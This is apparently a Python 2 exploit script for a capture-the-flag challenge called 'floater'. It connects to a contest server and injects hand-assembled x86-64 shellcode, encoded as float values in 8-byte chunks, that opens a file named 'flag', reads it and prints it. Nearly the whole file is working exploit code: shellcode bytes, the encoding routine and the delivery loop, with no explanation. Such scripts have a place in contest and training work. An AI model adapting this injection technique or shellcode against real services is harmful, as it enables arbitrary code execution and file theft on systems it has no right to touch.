import struct
from threading import Thread
from zio import *

target = './floater'
target = ('floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me',754)

def get_input(v):
    f = struct.unpack('<d', l64(v))
    f = struct.unpack('<f', l64(v)[0:4])
    ret = str(f[0])
    print hex(v), (ret)
    return ret





def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

sc = ''
sc += '\x48\x89\xe0\xe9\x00\x00\x00\x00' #mov rax, rsp
sc += '\x48\x83\xec\xe8\x00\x00\x00\x00' #sub rsp, 0x80
sc += '\x6a\x00\x90\xe9\x00\x00\x00\x00' #push 0
sc += '\x48\x89\xe5\xe9\x00\x00\x00\x00' #mov rbp, rsp
sc += '\xc6\x45\x00\x66\x00\x00\x00\x00' # mov byte [rsp], 0x66
sc += '\x5a\x52\x90\xe9\x00\x00\x00\x00' #pop rdx; push rdx
sc += '\x48\xff\xc5\xe9\x00\x00\x00\x00' #inc rbp
sc += '\xc6\x45\x00\x6c\x00\x00\x00\x00' # mov byte [rsp], 0x6c
sc += '\x48\xff\xc5\xe9\x00\x00\x00\x00' #inc rbp
sc += '\x48\x31\xf6\xe9\x00\x00\x00\x00' #xor rsi, rsi
sc += '\xc6\x45\x00\x61\x00\x00\x00\x00' # mov byte [rsp], 0x61
sc += '\x48\xff\xc5\xe9\x00\x00\x00\x00' #inc rbp
sc += '\xc6\x45\x00\x67\x00\x00\x00\x00' # mov byte [rsp], 0x67
sc += '\x48\x89\xe7\xe9\x00\x00\x00\x00' # mov rdi, rsp
sc += '\x6a\x02\x58\xe9\x00\x00\x00\x00' #push 2; pop rax
sc += '\x0f\x05\x90\xe9\x00\x00\x00\x00' #syscall
sc += '\x48\x89\xe6\xe9\x00\x00\x00\x00' # mov rsi, rsp
sc += '\x48\x89\xc7\xe9\x00\x00\x00\x00' #mov rdi, rax
sc += '\x48\x31\xc0\xe9\x00\x00\x00\x00' #xor rax, rax
sc += '\x0f\x05\x90\xe9\x00\x00\x00\x00' #syscall
sc += '\x6a\x01\x58\xe9\x00\x00\x00\x00' #push 1; pop rax
sc += '\x6a\x01\x5f\xe9\x00\x00\x00\x00' #push 1; pop rdi
sc += '\x0f\x05\x90\xe9\x00\x00\x00\x00' #syscall


def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    io.gdb_hint()
    f = open('./floater.bin', 'rb')
    d = f.read()
    f.close()

    for i in range(len(sc)/8):
        v = get_input(l64(sc[i*8:i*8+8]))
        print v
        io.writeline(v)

    for i in range(24-len(sc)/8):
        io.writeline('1')

    io.gdb_hint()
    interact(io)


exp(target)



